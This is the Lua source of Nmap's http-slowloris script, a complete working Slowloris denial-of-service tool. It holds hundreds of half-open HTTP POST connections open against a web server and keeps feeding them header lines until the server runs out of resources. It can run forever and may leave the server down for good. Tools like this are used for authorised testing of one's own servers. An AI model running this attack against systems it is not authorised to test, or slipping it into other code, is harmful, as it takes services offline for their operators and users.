local coroutine = require "coroutine"
local math = require "math"
local nmap = require "nmap"
local os = require "os"
local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"
local comm = require "comm"

description = [[
Tests a web server for vulnerability to the Slowloris DoS attack by launching a Slowloris attack.

Slowloris was described at Defcon 17 by RSnake
(see http://ha.ckers.org/slowloris/).

This script opens and maintains numerous 'half-HTTP' connections until
the server runs out of ressources, leading to a denial of service. When
a successful DoS is detected, the script stops the attack and returns
these pieces of information (which may be useful to tweak further
filtering rules):
* Time taken until DoS
* Number of sockets used
* Number of queries sent
By default the script runs for 30 minutes if DoS is not achieved.

Please note that the number of concurrent connexions must be defined
with the <code>--max-parallelism</code> option (default is 20, suggested
is 400 or more) Also, be advised that in some cases this attack can
bring the web server down for good, not only while the attack is
running.

Also, due to OS limitations, the script is unlikely to work
when run from Windows.
]]

---
-- @usage
-- nmap --script http-slowloris --max-parallelism 400  <target>
--
-- @args http-slowloris.runforever Specify that the script should continue the
-- attack forever. Defaults to false.
-- @args http-slowloris.send_interval Time to wait before sending new http header datas
-- in order to maintain the connection. Defaults to 100 seconds.
-- @args http-slowloris.timelimit Specify maximum run time for DoS attack (30
-- minutes default).
--
-- @output
-- PORT     STATE SERVICE REASON  VERSION
-- 80/tcp   open  http    syn-ack Apache httpd 2.2.20 ((Ubuntu))
-- | http-slowloris:
-- |   Vulnerable:
-- |   the DoS attack took +2m22s
-- |   with 501 concurrent connections
-- |_  and 441 sent queries

author = "Aleksandar Nikolic, Ange Gutek"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}


portrule = shortport.http

local SendInterval = {}
local TimeLimit = {}


-- this will save the amount of still connected threads
local ThreadCount = {}

-- the maximum amount of sockets during the attack. This could be lower than the
-- requested concurrent connections because of the webserver configuration (eg
-- maxClients on Apache)
local Sockets = {}

-- this will save the amount of new lines sent to the half-http requests until
-- the target runs out of ressources
local Queries = {}

local ServerNotice = {}
local DOSed = {}
local StopAll = {}
local Reason = {} -- DoSed due to slowloris attack or something else
local Bestopt= {}

-- a function to make a unique key for a table
local function getKey(host,port)
  return tostring(port.number) .. tostring(port.service) .. tostring(host.ip)
end

-- get time (in milliseconds) when the script should finish
local function get_end_time(host,port)
  if TimeLimit[getKey(host,port)] == nil then
    return -1
  end
  return 1000 * TimeLimit[getKey(host,port)] + nmap.clock_ms()
end

local function set_parameters(host,port)
  SendInterval[getKey(host,port)] = stdnse.parse_timespec(stdnse.get_script_args('http-slowloris.send_interval') or '100s')
  if stdnse.get_script_args('http-slowloris.runforever') then
    TimeLimit[getKey(host,port)] = nil
  else
    TimeLimit[getKey(host,port)] = stdnse.parse_timespec(stdnse.get_script_args('http-slowloris.timelimit') or '30m')
  end
end

local function do_half_http(host, port, obj)
  local condvar = nmap.condvar(obj)

  if StopAll[getKey(host,port)] then
    condvar("signal")
    return
  end

  -- Create socket
  local slowloris = nmap.new_socket()
  slowloris:set_timeout(200 * 1000) -- Set a long timeout so our socked doesn't timeout while it's waiting

  ThreadCount[getKey(host,port)] = ThreadCount[getKey(host,port)] + 1
  local catch = function()
    -- This connection is now dead
    ThreadCount[getKey(host,port)] = ThreadCount[getKey(host,port)] - 1
    stdnse.debug1("[HALF HTTP]: lost connection")
    slowloris:close()
    slowloris = nil
    condvar("signal")
  end

  local try = nmap.new_try(catch)
  try(slowloris:connect(host.ip, port, Bestopt[getKey(host,port)]))

  -- Build a half-http header.
  local half_http = "POST /" .. tostring(math.random(100000, 900000)) .. " HTTP/1.1\r\n" ..
    "Host: " .. host.ip .. "\r\n" ..
    "User-Agent: " .. http.USER_AGENT .. "\r\n" ..
    "Content-Length: 42\r\n"

  try(slowloris:send(half_http))
  ServerNotice[getKey(host,port)] = " (attack against " .. host.ip .. "): HTTP stream started."

  -- During the attack some connections will die and other will respawn.
  -- Here we keep in mind the maximum concurrent connections reached.

  if Sockets[getKey(host,port)] <= ThreadCount[getKey(host,port)] then Sockets[getKey(host,port)] = ThreadCount[getKey(host,port)] end

  -- Maintain a pending HTTP request by adding a new line at a regular 'feed' interval
  while true do
    if StopAll[getKey(host,port)] then
      break
    end
    stdnse.sleep(SendInterval[getKey(host,port)])
    try(slowloris:send("X-a: b\r\n"))
    ServerNotice[getKey(host,port)] = " (attack against " .. host.ip .. "): Feeding HTTP stream..."
    Queries[getKey(host,port)] = Queries[getKey(host,port)] + 1
    ServerNotice[getKey(host,port)] = ServerNotice[getKey(host,port)] .. "\n(attack against " .. host.ip .. "): " .. Queries[getKey(host,port)] .. " queries sent using " .. ThreadCount[getKey(host,port)] .. " connections."
  end
  slowloris:close()
  ThreadCount[getKey(host,port)] = ThreadCount[getKey(host,port)] - 1
  condvar("signal")
end


-- Monitor the web server
local function do_monitor(host, port)
  local general_faults = 0
  local request_faults = 0 -- keeps track of how many times we didn't get a reply from the server

  stdnse.debug1("[MONITOR]: Monitoring " .. host.ip .. " started")

  local request = "GET / HTTP/1.1\r\n" ..
    "Host: " .. host.ip ..
    "\r\nUser-Agent: " .. http.USER_AGENT .. "\r\n\r\n"
  local opts = {}
  local _

  _, _, Bestopt[getKey(host,port)] = comm.tryssl(host, port, "GET / \r\n\r\n", opts) -- first determine if we need ssl

  while not StopAll[getKey(host,port)] do
    local monitor = nmap.new_socket()
    local status  = monitor:connect(host.ip, port, Bestopt[getKey(host,port)])
    if not status then
      general_faults = general_faults + 1
      if general_faults > 3 then
        Reason[getKey(host,port)] = "not-slowloris"
        DOSed[getKey(host,port)] = true
        break
      end
    else
      status = monitor:send(request)
      if not status then
        general_faults = general_faults + 1
        if general_faults > 3 then
          Reason[getKey(host,port)] = "not-slowloris"
          DOSed[getKey(host,port)] = true
          break
        end
      end
      status, _ = monitor:receive_lines(1)
      if not status then
        stdnse.debug1("[MONITOR]: Didn't get a reply from " .. host.ip  .. "." )
        monitor:close()
        request_faults = request_faults +1
        if request_faults > 3 then
          if TimeLimit[getKey(host,port)] then
            stdnse.debug1("[MONITOR]: server " .. host.ip .. " is now unavailable. The attack worked.")
            DOSed[getKey(host,port)] = true
          end
          monitor:close()
          break
        end
      else
        request_faults = 0
        general_faults = 0
        stdnse.debug1("[MONITOR]: ".. host.ip .." still up, answer received.")
        stdnse.sleep(10)
        monitor:close()
      end
      if StopAll[getKey(host,port)] then
        break
      end
    end
  end
end

local Mutex = nmap.mutex("http-slowloris")

local function worker_scheduler(host, port)
  local Threads = {}
  local obj = {}
  local condvar = nmap.condvar(obj)
  local i

  for i = 1, 1000 do
    -- The real amount of sockets is triggered by the
    -- '--max-parallelism' option. The remaining threads will replace
    -- dead sockets during the attack
    local co = stdnse.new_thread(do_half_http, host, port, obj)
    Threads[co] = true
  end

  while not DOSed[getKey(host,port)] and not StopAll[getKey(host,port)] do
    -- keep creating new threads, in case we want to run the attack indefinitely
    repeat
      if StopAll[getKey(host,port)] then
        return
      end

      for thread in pairs(Threads) do
        if coroutine.status(thread) == "dead" then
          Threads[thread] = nil
        end
      end
      stdnse.debug1("[SCHEDULER]: starting new thread")
      local co = stdnse.new_thread(do_half_http, host, port, obj)
      Threads[co] = true
      if ( next(Threads) ) then
        condvar("wait")
      end
    until next(Threads) == nil;
  end
end

action = function(host, port)
  
  SendInterval[getKey(host,port)] = nil
  TimeLimit[getKey(host,port)] = nil
  ThreadCount[getKey(host,port)] = 0
  Sockets[getKey(host,port)] = 0
  Queries[getKey(host,port)] = 0
  ServerNotice[getKey(host,port)] = nil
  DOSed[getKey(host,port)] = false
  StopAll[getKey(host,port)] = false
  Reason[getKey(host,port)] = "slowloris"
  Bestopt[getKey(host,port)] = nil


  Mutex("lock") -- we want only one slowloris instance running at a single
  -- time even if multiple hosts are specified
  -- in order to have as many sockets as we can available to
  -- this script

  set_parameters(host,port)

  local output = {}
  local start, stop, dos_time

  start = os.date("!*t")
  -- The first thread is for monitoring and is launched before the attack threads
  stdnse.new_thread(do_monitor, host, port)
  stdnse.sleep(2) -- let the monitor make the first request

  stdnse.debug1("[MAIN THREAD]: starting scheduler")
  stdnse.new_thread(worker_scheduler, host, port)
  local end_time = get_end_time(host,port)
  local last_message
  if TimeLimit[getKey(host,port)] == nil then
    stdnse.debug1("[MAIN THREAD]: running forever!")
  end

  -- return a live notice from time to time
  while (nmap.clock_ms() < end_time or TimeLimit == nil) and not StopAll[getKey(host,port)] do
    if ServerNotice[getKey(host,port)] ~= last_message then
      -- don't flood the output by repeating the same info
      stdnse.debug1("[MAIN THREAD]: " .. ServerNotice[getKey(host,port)])
      last_message = ServerNotice[getKey(host,port)]
    end
    if DOSed[getKey(host,port)] and TimeLimit[getKey(host,port)] ~= nil then
      break
    end
    stdnse.sleep(10)
  end

  stop = os.date("!*t")
  dos_time = stdnse.format_difftime(stop, start)
  StopAll[getKey(host,port)] = true
  if DOSed[getKey(host,port)] then
    if Reason[getKey(host,port)] == "slowloris" then
      stdnse.debug2("Slowloris Attack stopped, building output")
      output = "Vulnerable:\n" ..
        "the DoS attack took "..
        dos_time .. "\n" ..
        "with ".. Sockets[getKey(host,port)] .. " concurrent connections\n" ..
        "and " .. Queries[getKey(host,port)] .." sent queries"
    else
      stdnse.debug2("Slowloris Attack stopped. Monitor couldn't communicate with the server.")
      output = "Probably vulnerable:\n" ..
        "the DoS attack took " .. dos_time .. "\n" ..
        "with " .. Sockets[getKey(host,port)] .. " concurrent connections\n" ..
        "and " .. Queries[getKey(host,port)] .. " sent queries\n" ..
        "Monitoring thread couldn't communicate with the server. " ..
        "This is probably due to max clients exhaustion or something similar but not due to slowloris attack."
    end
    Mutex("done") -- release the mutex
    return stdnse.format_output(true, output)
  end
  Mutex("done") -- release the mutex
  return false
end